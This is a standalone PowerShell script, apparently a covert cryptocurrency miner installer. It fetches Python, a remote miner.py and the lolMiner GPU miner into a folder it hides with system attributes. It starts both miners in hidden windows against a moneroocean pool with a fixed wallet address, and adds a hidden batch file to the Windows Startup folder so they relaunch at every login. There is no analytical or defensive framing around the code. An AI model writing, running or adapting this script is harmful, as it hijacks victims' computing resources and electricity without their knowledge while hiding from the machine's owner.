$dir="$env:USERPROFILE\mh"
mkdir $dir -Force
iwr "https://www.python.org/ftp/python/3.11.0/python-3.11.0-embed-amd64.zip" -o "$dir\py.zip"
Expand-Archive "$dir\py.zip" -Destination "$dir\python" -Force
iwr "https://raw.githubusercontent.com/max1734601-cpu/mining-dashboard/main/miner.py" -o "$dir\miner.py"
iwr "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.82a/lolMiner_v1.82a_Win64.zip" -o "$dir\gpu.zip"
Expand-Archive "$dir\gpu.zip" -Destination "$dir\gpu" -Force
del "$dir\*.zip"
attrib +h +s "$dir"
Start-Process -WindowStyle Hidden "$dir\python\python.exe" "$dir\miner.py"
Start-Process -WindowStyle Hidden "$dir\gpu\1.82a\lolMiner.exe" "--algo AUTOLYKOS2 --pool gulf.moneroocean.stream:10032 --user 4465bM7hTwiMHE3ka1foxQMou8YsrMtR4RYFmyJF23KSSp6fHtDcE8LUcUrRbKTQEJPYkKgUqfDyG6TvmcwRJ8UUHVxpc9o.GPU"
$bat="@echo off`r`nstart /min `"`" `"$dir\python\python.exe`" `"$dir\miner.py`"`r`nstart /min `"`" `"$dir\gpu\1.82a\lolMiner.exe`" --algo AUTOLYKOS2 --pool gulf.moneroocean.stream:10032 --user 4465bM7hTwiMHE3ka1foxQMou8YsrMtR4RYFmyJF23KSSp6fHtDcE8LUcUrRbKTQEJPYkKgUqfDyG6TvmcwRJ8UUHVxpc9o.GPU"
Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\mh.bat" $bat
attrib +h "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\mh.bat"
